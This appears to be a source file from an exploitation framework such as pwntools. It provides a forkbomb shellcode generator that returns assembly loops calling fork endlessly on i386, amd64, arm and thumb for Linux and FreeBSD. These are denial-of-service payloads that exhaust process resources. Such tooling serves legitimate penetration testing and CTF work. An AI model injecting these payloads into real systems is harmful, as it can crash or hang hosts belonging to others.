from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
def forkbomb(os = None, arch = None):
    """Spawns a fork bomb. Fork fork fork fork fork."""
    if arch == 'i386':
        if os in ['linux', 'freebsd']:
            return _forkbomb_i386()
    elif arch == 'amd64':
        if os in ['linux', 'freebsd']:
            return _forkbomb_amd64()
    elif arch == 'arm':
        if os in ['linux']: # freebsd should work too, though I haven't tested
            return _forkbomb_arm()
    elif arch == 'thumb':
        if os in ['linux']: # freebsd should work too, though I haven't tested
            return _forkbomb_thumb()

    no_support('forkbomb', os, arch)

def _forkbomb_i386():
    return """
forkbomb:
    push SYS_fork
    pop eax
    int 0x80
    jmp forkbomb
"""

def _forkbomb_amd64():
    return """
forkbomb:
    push SYS_fork
    pop rax
    syscall
    jmp forkbomb
"""

def _forkbomb_arm():
    return """
forkbomb:
    svc SYS_fork
    b forkbomb
"""

def _forkbomb_thumb():
    return """
fork_bomb:
    mov r7, #SYS_fork
    svc 1
    b fork_bomb
"""
